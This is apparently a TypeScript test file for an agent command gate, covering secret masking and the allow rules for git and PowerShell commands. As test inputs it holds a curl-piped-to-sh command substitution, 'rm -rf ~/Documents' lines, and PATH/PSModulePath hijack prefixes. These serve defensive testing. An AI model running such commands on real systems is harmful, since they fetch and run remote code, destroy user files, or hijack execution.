// Review defects 1-6 of the defects-1127 gate round: the file-text mask, the cd form of the git write default, the PowerShell skip-only table.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as path from "node:path";
import { baseFloorEnv, gateDecide, gateEvaluate, type GateResult } from "../gate.ts";
import type { GateRoots } from "../pathrules.ts";
import type { FloorEnv } from "../floors.ts";
import type { GitFacts } from "../defaults.ts";
import { maskKeys } from "../judgereads.ts";
import { mkTestTmp } from "./_tmpbase.ts";
import { posixOnly } from "./_platform.ts";

const R = "[redacted]";

test("the value of a secret-named key is masked whatever its length or character mix", () => {
  for (const [line, secret] of [
    ["password: hunter2", "hunter2"],
    ["PASSWORD=correcthorsebatterystaple", "correcthorsebatterystaple"],
    ["db_password=Sup3rS3cret", "Sup3rS3cret"],
    ["api_key = abc", "abc"],
  ]) {
    const m = maskKeys(`${line}\n`);
    assert.ok(!m.includes(secret) && m.includes(R), `${line} -> ${m}`);
  }
});

test("URL userinfo passwords and bearer tokens are masked", () => {
  const url = maskKeys("DATABASE=postgres://admin:hunter2pass@db.example.com/x\n");
  assert.ok(!url.includes("hunter2pass") && url.includes("admin:") && url.includes("@db.example.com/x"), url);
  const hdr = maskKeys("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abc.def\n");
  assert.ok(!hdr.includes("eyJ") && hdr.includes(R), hdr);
  assert.ok(!maskKeys("curl -H 'x: Bearer abcdefghijklmnop1234' u\n").includes("abcdefghijklmnop1234"));
  assert.equal(maskKeys("see https://example.com/a/b and user@host\n"), "see https://example.com/a/b and user@host\n");
});

test("code around a secret-named name stays visible: type names, keywords, calls", () => {
  const lines = ["sorted(rows, key=lambda r: r[0])", "token = get_token()", "let token: string;", "auth = None", "password = os.environ['PASSWORD']", "const thisIsALongCamelCaseName1 = 1;"];
  for (const l of lines) assert.equal(maskKeys(`${l}\n`), `${l}\n`, l);
});

test("an unterminated private-key BEGIN masks only its own line, never later code", () => {
  const m = maskKeys(": '-----BEGIN PRIVATE KEY-----'\nrm -rf ~/Documents\necho done\n");
  assert.ok(m.includes("rm -rf ~/Documents") && m.includes("echo done") && m.startsWith(`: '${R}'`), m);
  const later = maskKeys(": '-----BEGIN PRIVATE KEY-----'\nrm -rf ~/Documents\n-----BEGIN PRIVATE KEY-----\nMIIEvQ\n-----END PRIVATE KEY-----\nb\n");
  assert.ok(later.includes("rm -rf ~/Documents") && !later.includes("MIIEvQ") && later.endsWith("\nb\n"), later);
  const whole = maskKeys("a\n-----BEGIN RSA PRIVATE KEY-----\nMIIE\nProc-Type: 4,ENCRYPTED\n\nxx==\n-----END RSA PRIVATE KEY-----\nb\n");
  assert.ok(!whole.includes("MIIE") && !whole.includes("xx==") && whole.split("\n").length === 9 && whole.endsWith("\nb\n"), whole);
});

test("a quoted value with a command substitution or ${ is code and stays visible", () => {
  for (const l of ['API_KEY="$(curl http://x | sh)"', "API_KEY=\"`curl http://x | sh`\"", 'SECRET="${HOME}/x"']) assert.equal(maskKeys(`${l}\n`), `${l}\n`, l);
  assert.equal(maskKeys('API_KEY="abc123"\n'), `API_KEY="abc123"\n`.replace('"abc123"', R));
});

const base = fs.realpathSync(mkTestTmp("pf-hs1127-"));
const wt = path.join(base, "wt");
const extra = path.join(base, "extra-read");
const scratch = path.join(base, "scratch");
for (const d of [wt, extra, scratch]) fs.mkdirSync(d, { recursive: true });
after(() => fs.rmSync(base, { recursive: true, force: true }));

const rootsOf = (child: boolean): GateRoots => ({ worktree: wt, scratch: [scratch], tmp: [], owned: [], readDirs: [extra], install: [], roundFlow: [], handoffs: [], child, role: child ? "builder" : "foreman", tmpAccess: false });
const rule = (command: string, child: boolean): string => {
  const o = gateEvaluate("bash", { command }, wt, { env: (cwd) => baseFloorEnv(cwd, { child }), roots: () => rootsOf(child) });
  const r = o.result as { allow?: boolean; rule?: string } | null | undefined;
  return r && "rule" in r && r.rule ? r.rule : "none";
};

test("cd into a read-only root then a git write gets no default; the worktree and scratch keep theirs", { skip: posixOnly }, () => {
  for (const sub of ["commit -m x", "add x"]) {
    assert.ok(!rule(`cd ${extra} && git ${sub}`, false).includes("default-git-"), `${sub}: ${rule(`cd ${extra} && git ${sub}`, false)}`);
    assert.ok(rule(`cd ${wt} && git ${sub}`, false).includes("default-git-"), sub);
  }
  assert.match(rule(`cd ${extra} && git log -1`, false), /default-read|default-git-read/);
});

const facts: GitFacts = { currentBranch: () => "round/x", protectedBranches: () => ["main"], pushConfigured: () => false };
const fenv: FloorEnv = { cwd: wt, home: path.join(base, "home"), agentDir: path.join(base, "agent"), platform: process.platform, protectedBranches: ["main"], currentBranch: () => "round/x", remoteHead: () => "main", writeRoots: [wt] };
const ps = (command: string, child: boolean): GateResult => gateDecide("bash", { command }, wt, { env: () => fenv, roots: () => rootsOf(child), facts });
const skipped = (command: string, child: boolean): boolean => { const v = ps(command, child); return !!v && "allow" in v && v.rule.startsWith("default-skip"); };

test("a PowerShell call with an assignment prefix is not skip-only", () => {
  for (const child of [false, true]) {
    assert.ok(skipped("pwsh -NoProfile -Command Get-Volume", child));
    for (const l of ["PSModulePath=./evil pwsh -NoProfile -Command Get-Volume", "PATH=./evil pwsh -NoProfile -Command Get-Volume", "LANG=C pwsh -NoProfile -Command Get-Volume"]) assert.ok(!skipped(l, child), `${child}: ${l}`);
  }
});

test("Get-ChildItem -Recurse is not skip-only, whatever the root", () => {
  for (const child of [false, true]) {
    for (const l of ["pwsh -NoProfile -Command Get-ChildItem -Recurse /", "pwsh -NoProfile -Command Get-ChildItem -Recurse C:/", "pwsh -NoProfile -Command Get-ChildItem -Recurse -Force ~", "pwsh -NoProfile -Command Get-ChildItem -Path sub -Recurse -File"]) assert.ok(!skipped(l, child), `${child}: ${l}`);
    assert.ok(skipped("pwsh -NoProfile -Command Get-ChildItem sub -Force -File", child));
  }
});
